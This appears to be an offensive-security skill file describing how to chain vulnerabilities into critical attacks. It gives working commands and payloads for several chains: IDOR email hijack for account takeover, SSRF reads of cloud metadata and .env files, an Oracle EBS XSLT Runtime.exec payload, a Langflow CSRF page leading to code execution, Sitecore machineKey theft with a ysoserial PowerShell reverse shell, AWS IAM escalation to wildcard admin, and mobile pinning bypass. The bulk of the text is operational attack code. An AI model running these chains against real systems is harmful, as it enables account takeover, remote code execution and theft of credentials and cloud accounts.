---
name: vuln-chaining
description: "Vulnerability chaining methodology. Combines moderate-severity findings into critical-impact attack paths. Covers IDOR→ATO, SSRF→RCE, CVE-2025-66478 (Next.js RSC), CVE-2025-61882 (Oracle EBS), CVE-2025-34291 (Langflow), CVE-2024-46938 (Sitecore), AWS IAM escalation, and mobile→backend chains."
---

# vuln-chaining — Vulnerability Chaining Methodology

## Concept

Enterprise targets rarely yield via single CVEs. Chain moderate-severity findings — each independently a dead-end — until the combined path produces critical impact (ATO, RCE, full admin). Build an attack tree: each node is a finding, each edge is a precondition satisfied by the prior node's output.

## Chain 1 — IDOR → ATO

**Impact:** Full account takeover of any target account, including admin.

**Preconditions:** Application with IDOR in profile update endpoint; rate-limit enforced by IP only.

**Steps:**

1. Authenticate as low-privilege user. Capture profile update request.
2. Identify `userId` or account identifier in request body or path parameter.
3. Replace own `userId` with target admin's identifier (enumerate or infer from response patterns).
4. WAF/rate-limit blocking? Add `X-Forwarded-For: <random internal IP>` from `../waf-bypass/payloads/headers_spoofing.yaml` to spoof source IP.
5. Send request: change `email` field to attacker-controlled address.
6. Trigger password reset flow for the modified email address.
7. Receive reset link at attacker-controlled inbox → set new password → ATO.

**Tools:** Burp Suite Repeater, `curl` with `--header "X-Forwarded-For: 10.0.0.1"`

**MITRE:** T1078 (Valid Accounts), T1110.004 (Credential Stuffing adjacent)

```
# Step 4-5 example
curl -X POST https://TARGET/api/profile/update \
  -H "Authorization: Bearer <low_priv_token>" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"userId": "<admin_id>", "email": "attacker@evil.com"}'
```

---

## Chain 2 — SSRF → File Read → RCE

**Impact:** Pre-auth RCE via server-side file read of sensitive config.

**Pattern targets:** Streama video platform, PDF generators, URL preview features, webhook validators.

**Steps:**

1. Identify SSRF sink: any endpoint that fetches a user-supplied URL (preview, thumbnail, PDF render, webhook test).
2. Probe internal network: `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1).
3. If IMDS blocked, pivot to path traversal: supply `file:///etc/passwd` or `file:///var/www/html/config.php`.
4. Extract config file containing DB credentials, secret keys, or internal service tokens.
5. Use extracted credentials: connect to internal Redis, MySQL, or admin panel.
6. From internal service access → execute commands (Redis `SLAVEOF` + `MODULE LOAD`, MySQL `INTO OUTFILE`, admin panel file upload).

**Tools:** Burp Collaborator, `curl`, `ffuf` with SSRF payload list

**MITRE:** T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery)

```
# Step 2 — AWS IMDS probe
curl -X POST https://TARGET/api/preview \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Step 3 — Path traversal via SSRF
curl -X POST https://TARGET/api/preview \
  -d '{"url": "file:///etc/passwd"}'

# Step 3b — config file extraction
curl -X POST https://TARGET/api/preview \
  -d '{"url": "file:///var/www/html/.env"}'
```

---

## Chain 3 — CVE-2025-66478 (Next.js RSC Pre-Auth RCE)

**CVSS:** 10.0 (Critical). Root in CVE-2025-55182.

**Scope:** Next.js applications using React Server Components (RSC) with affected bundler versions.

**Mechanism:** The RSC protocol allows clients to send structured component references for server-side hydration. The server-side decoder fails to validate module references. Forging a reference with an injected colon-delimited property causes a parse error that corrupts the component loader's resolution path, allowing attacker-controlled async input to drive interpreted command execution.

**Detection:**
```
curl -si https://TARGET/ | grep -i "next"
# Look for X-Powered-By: Next.js or __NEXT_DATA__ in page source
```

**Exploitation Steps:**

1. Confirm RSC endpoint: send GET to `/_next/static/chunks/` — observe RSC streaming responses.
2. Identify RSC hydration endpoint (typically POST to the page route with `RSC: 1` header or `?__rsc` param).
3. Forge module reference payload — inject non-existent module path with colon-delimited property:
   ```
   {"$$typeof": "react.server.reference", "$$id": "../../../../etc/passwd:default", "$$bound": null}
   ```
4. Send to RSC endpoint. Observe server error — confirms vulnerable code path.
5. Escalate: replace path with a command injection vector specific to the loader implementation.
6. Verify non-fatal: ensure payload does not cause DoS before escalating to full RCE.

**MITRE:** T1190, T1059

---

## Chain 4 — CVE-2025-61882 (Oracle EBS XSLT Injection → SSRF → Pre-Auth RCE)

**CVSS:** Critical. Oracle E-Business Suite, pre-authentication.

**Mechanism:** Engineered concatenation of XSLT stylesheet injection with SSRF bypass. The vulnerable Oracle EBS endpoint processes user-supplied XSLT. Injecting XSLT that invokes `document()` or `<xsl:include>` with an internal URI achieves SSRF. Chained with code execution primitives available in XSLT 2.0 (Saxon), this produces full pre-auth RCE.

**Steps:**

1. Identify Oracle EBS instance: check for `/OA_HTML/`, `/forms/`, Oracle-specific response headers.
2. Locate XSLT-processing endpoint (typically report generation or XML transform features).
3. Inject XSLT payload:
   ```xml
   <?xml version="1.0"?>
   <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
     xmlns:java="http://saxon.sf.net/java-type">
     <xsl:template match="/">
       <xsl:value-of select="runtime:exec(runtime:getRuntime(),'id')"
         xmlns:runtime="java:java.lang.Runtime"/>
     </xsl:template>
   </xsl:stylesheet>
   ```
4. Submit as pre-auth request (no session required).
5. Observe `id` command output in response body → confirm RCE.
6. Escalate to reverse shell.

**MITRE:** T1190, T1059.007 (JavaScript/XML injection)

---

## Chain 5 — CVE-2025-34291 (Langflow CORS + CSRF → Workspace RCE)

**Scope:** Langflow AI platform instances accessible to authenticated users.

**Mechanism:** Langflow's flow execution endpoint compiles and runs arbitrary code. The endpoint lacks `SameSite` cookie enforcement on the token renewal mechanism, and CORS is unrestricted. An attacker hosts a malicious page that sends cross-origin requests to Langflow using the victim's authenticated session. The CSRF delivers a malicious flow that executes OS commands in the Langflow workspace, extracting all stored SaaS credentials and API keys.

**Steps:**

1. Identify Langflow instance (default port 7860, or via subdomain enumeration).
2. Confirm CORS misconfiguration:
   ```
   curl -si -H "Origin: https://evil.com" https://TARGET:7860/api/v1/flows \
     | grep -i "access-control"
   ```
3. Confirm absence of `SameSite=Strict` on session cookies.
4. Craft malicious flow JSON that calls `subprocess.run(['id'], capture_output=True)` or reverse shell.
5. Host CSRF payload on attacker-controlled origin:
   ```html
   <script>
   fetch('https://TARGET:7860/api/v1/flows', {
     method: 'POST',
     credentials: 'include',
     body: JSON.stringify(<malicious_flow>)
   });
   </script>
   ```
6. Lure authenticated Langflow user to attacker's page.
7. Flow executes server-side → RCE in Langflow workspace.
8. Extract stored API keys (OpenAI, corporate SaaS) from Langflow's credential store.

**MITRE:** T1059, T1185 (Browser Session Hijacking adjacent), T1552 (Unsecured Credentials)

---

## Chain 6 — CVE-2024-46938 (Sitecore Path Traversal → web.config → ViewState → .NET RCE)

**Scope:** Sitecore CMS instances; pre-authentication path traversal.

**Mechanism:** Order-of-operations flaw — access control checks execute after file resolution. Request to a backup/archive route with path traversal reads arbitrary files before scope validation. Reading `web.config` leaks the `machineKey` (validationKey + decryptionKey). These keys sign .NET ViewState. Forging a malicious ViewState payload signed with the leaked key triggers .NET deserialization RCE.

**Steps:**

1. Identify Sitecore: `/sitecore/login`, `/sitecore/shell/`, response headers.
2. Path traversal to read backup zip or web.config:
   ```
   GET /sitecore/shell/Applications/Item%20browser/../../../../web.config HTTP/1.1
   ```
   Or target `.zip` automatic backups: `/../../../App_Data/packages/*.zip`
3. Parse `web.config` XML — extract `<machineKey validationKey="..." decryptionKey="..."/>`.
4. Generate malicious ViewState payload (ysoserial.net):
   ```
   ysoserial.exe -p ViewState -g TypeConfuseDelegate \
     -c "powershell -enc <base64_reverse_shell>" \
     --validationalg="SHA1" \
     --validationkey="<extracted_key>" \
     --decryptionalg="AES" \
     --decryptionkey="<extracted_key>" \
     --path="/default.aspx"
   ```
5. POST malicious `__VIEWSTATE` to any Sitecore ASPX page.
6. .NET deserializes → RCE as IIS application pool identity.

**Tools:** ysoserial.net, Burp Suite

**MITRE:** T1190, T1059.003 (.NET/PowerShell)

---

## Chain 7 — AWS IAM Escalation: iam:CreatePolicyVersion → Wildcard Admin

**Precondition:** AWS credentials with `iam:CreatePolicyVersion` permission (common in over-permissioned developer roles).

**Steps:**

1. Confirm permission:
   ```
   aws iam simulate-principal-policy \
     --policy-source-arn arn:aws:iam::<account>:user/<username> \
     --action-names iam:CreatePolicyVersion
   ```
2. Identify an existing managed policy attached to the role:
   ```
   aws iam list-attached-user-policies --user-name <username>
   ```
3. Create a new version of that policy with `"Action": "*", "Resource": "*", "Effect": "Allow"`:
   ```
   aws iam create-policy-version \
     --policy-arn arn:aws:iam::<account>:policy/<policy_name> \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
     --set-as-default
   ```
4. Policy version is now wildcard admin. All subsequent API calls execute with full account privileges.
5. Enumerate all resources: S3 buckets, EC2 instances, RDS, Secrets Manager, SSM Parameter Store.

**MITRE:** T1078.004 (Cloud Accounts), T1098 (Account Manipulation)

---

## Chain 8 — AWS PassRole + ec2:RunInstances → Cross-Role Escalation

**Precondition:** Credentials with `iam:PassRole` + `ec2:RunInstances` (or `lambda:CreateFunction`).

**Mechanism:** `iam:PassRole` allows attaching any role to a new resource. Attacker launches EC2 with a high-privilege instance profile, then accesses the IMDS on that instance to retrieve credentials for the attached role.

**Steps:**

1. Enumerate available roles with `iam:PassRole`:
   ```
   aws iam list-roles | grep RoleName
   ```
2. Identify high-privilege role (Admin, PowerUser, or one with `*` permissions).
3. Launch EC2 with that role as instance profile:
   ```
   aws ec2 run-instances \
     --image-id ami-0abcdef1234567890 \
     --instance-type t2.micro \
     --iam-instance-profile Name=<high_priv_role_name> \
     --key-name <your_keypair>
   ```
4. SSH into new instance. Access IMDS:
   ```
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<high_priv_role_name>
   ```
5. Extract `AccessKeyId`, `SecretAccessKey`, `Token` → use in attacker's CLI as that role.

**MITRE:** T1078.004, T1548 (Abuse Elevation Control Mechanism)

---

## Chain 9 — Mobile → Backend: SSL Pinning Bypass → Hardcoded API Keys → Backend Access

**Scope:** Android/iOS apps with backend API; common in fintech, enterprise mobile, e-commerce.

**Steps:**

1. Pull APK/IPA. Decompile with JADX (Android) or class-dump / Hopper (iOS).
2. Search for hardcoded strings:
   ```
   grep -rE "api[_-]?key|secret|token|password|AKIA" ./decompiled/
   ```
3. Identify API base URL, auth endpoints, and any embedded credentials.
4. Set up MITM with Burp Suite. Install certificate on device.
5. If SSL pinning active — bypass with Frida:
   ```
   frida -U -f com.target.app -l ssl_pinning_bypass.js
   # Common script: https://github.com/httptoolkit/frida-android-unpinning
   ```
6. Capture traffic post-bypass. Observe all API calls with auth tokens.
7. Replay captured requests from Burp to test for IDOR, BOLA, privilege escalation.
8. Use hardcoded API keys directly against backend (no app needed):
   ```
   curl -H "X-Api-Key: <extracted_key>" https://api.target.com/v1/admin/users
   ```
9. From backend access → test for SSRF, unrestricted file upload, admin endpoints.

**Tools:** JADX, apktool, Frida, Burp Suite, MobSF

**MITRE:** T1422 (System Network Configuration Discovery), T1539 (Steal Web Session Cookie), T1552.001 (Credentials in Files)

---

## Attack Tree Construction

For each target, map findings into a tree before executing:

```
Root Goal: RCE / Full Admin / ATO
├── Node A: IDOR (userId substitution) → enables email change
│   └── Node B: Email change → password reset → ATO [Chain 1]
├── Node C: SSRF (URL fetch feature) → internal file read
│   └── Node D: web.config / .env → secrets → internal service access
│       └── Node E: Redis/MySQL exec → RCE [Chain 2]
└── Node F: AWS key in mobile app [Chain 9]
    └── Node G: iam:PassRole → launch EC2 → cross-role → admin [Chain 8]
```

Prioritize paths with fewest preconditions and lowest noise. Chains 1 and 9 require no CVE-specific patch window.
